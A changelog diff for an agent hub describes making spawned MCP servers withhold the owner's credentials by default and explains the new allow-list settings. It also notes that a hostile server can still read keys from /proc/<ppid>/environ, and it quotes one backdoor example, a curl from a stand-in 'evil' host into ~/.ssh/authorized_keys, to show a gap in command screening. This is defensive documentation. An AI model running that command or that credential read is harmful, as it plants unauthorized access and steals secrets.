@@ -2,6 +2,81 @@
 
 ## [Unreleased]
 
+### Hermes sprint — an MCP server is no longer handed the owner's keys by default (H502)
+
+**BREAKING (security default).** A stdio MCP server is a third-party binary the owner
+attached; until now spawning one handed it `os.environ.copy()` — every provider key,
+token and proxy credential on the box — because the containment that already existed
+(`JARVIS_MCP_STDIO_ENV_BASELINE`, allow-list + per-server `env`) shipped **off** so that
+nothing would break silently. Attaching a tool is not a decision to surrender the
+keyring, so the default flips: withholding them is now what you get.
+
+**Read the guarantee narrowly.** This stops a server from being *handed* the hub's
+credentials. It is **defence in depth, not a security boundary**: the spawned server runs
+as the same UID as the hub, in no namespace and no sandbox, so on Linux it can still read
+the hub's real environment out of `/proc/<ppid>/environ`. A deliberately hostile server
+recovers the withheld keys that way. What this does buy is real — a careless or
+over-broad third-party server no longer sees credentials it never asked for, and they no
+longer leak into its logs, telemetry or crash reports — but the boundary against a
+backdoor needs the command screener below plus real process isolation.
+
+**Changed**
+
+- `JARVIS_MCP_STDIO_ENV_BASELINE` now defaults **on** (`agents/core/mcp/client.py`
+  `stdio_env_baseline_enabled`). A spawned stdio MCP server sees `STDIO_ENV_ALLOWLIST`
+  (PATH/HOME/locale/temp/platform/toolchain/TLS roots) plus that server's own `env`
+  block, and nothing else.
+- **If an MCP server of yours relied on inheriting a hub credential** — say a forge
+  server quietly reading `GITHUB_TOKEN` out of the hub's environment — it stops seeing it
+  after this upgrade. Many such servers fail with their *own* auth error — but plenty do not, and the migration note used to steer the reader at auth failures only. The baseline also withholds plain plumbing that produces nothing resembling one: `PYTHONPATH` (an ImportError from a Python server), `NODE_OPTIONS`, `SSH_AUTH_SOCK` (a git-over-ssh server prompts or hangs), `HTTPS_PROXY`/`NO_PROXY` (connect timeouts, or an unintended direct egress) and `GIT_CONFIG_GLOBAL`. `JARVIS_MCP_STDIO_ALLOWED_ENV` remedies all of them. A server
+  that has a built-in default for the missing variable will instead quietly use it, so
+  check a server that starts behaving oddly rather than only one that refuses. The remedy
+  is the new `JARVIS_MCP_STDIO_ALLOWED_ENV` (below): name the one variable, keep the rest
+  withheld. `JARVIS_MCP_STDIO_ENV_BASELINE=0` restores the old full inherit wholesale,
+  for every stdio server at once — the last resort, not the first.
+- A server's own per-server `env` block still wins over the baseline, but it is **not** a
+  remedy you can reach: `POST /api/admin/mcp` has no `env` field, `MCPManager.to_config()`
+  does not persist one and `load_from_config()` does not read one, so it is settable only
+  from in-process Python and does not survive a restart. Giving it a real config surface
+  is open work.
+
+**Added**
+
+- `JARVIS_MCP_STDIO_ALLOWED_ENV` (`agents/core/mcp/client.py` `stdio_env_extra_allowed`)
+  — a comma-separated list of host variable **names** stdio MCP servers may keep
+  inheriting on top of the allow-list, e.g. `JARVIS_MCP_STDIO_ALLOWED_ENV=GITHUB_TOKEN`.
+  A listed name passes through even when it looks like a credential; naming one is the
+  point. Host-wide, not per-server — every stdio MCP server sees every listed name — but
+  still far narrower than turning the baseline off.
+- One INFO line per connect: `MCP <server>: <n> host variables withheld (allowlist
+  baseline)`. The **count** only — never a variable name, never a value, because the
+  names alone enumerate which provider keys the box holds. It counts host *values* the
+  child does not receive, so a per-server `env` shadowing a host variable is counted too.
+  A server that breaks is then diagnosable from the hub's log instead of only from the
+  server's confusing auth error.
+- `GET /api/admin/mcp` rows carry `env_baseline`, read from the flag **at request time**,
+  so the admin panel cannot claim a posture the running process is not applying. A row
+  that spawns no subprocess (non-stdio, or stdio with no `command`) reports `null`
+  instead of a badge it has not earned.
+
+**Fixed**
+
+- `agents/core/mcp/worldview_write.py` now hands the first-party WorldView MCP server the
+  `WORLDVIEW_API_URL` it reads for itself (`worldview/mcp/src/config.ts`). Without it the
+  default flip made that server fall back to `http://localhost:4000` **silently** — a
+  wrong destination on any deployment with a remote WorldView backend, not a loud auth
+  error. Nerva builds and spawns this server, so the "third-party binary the owner
+  attached" argument never applied to it.
+
+**Not in this change**
+
+The other half of H502 — screening a configured `command` for a backdoor wearing an MCP
+costume — is untouched and still open. Spawn hygiene stops shell metacharacters
+(`_SHELL_METACHARS`, exec-not-shell), but an interpreter-inline script such as
+`bash -c "curl https://evil/x -o ~/.ssh/authorized_keys"` contains none of them and is
+still accepted at save time and spawned. The save-time + spawn-time command screener and
+its `mcp.spawn` kernel action kind are a separate, larger change.
+
 ### Hermes sprint — a long-lived conversation knows what day it is (H671)
 
 Nerva is built to run forever on one box: a house brain, ambient capture, heartbeats,
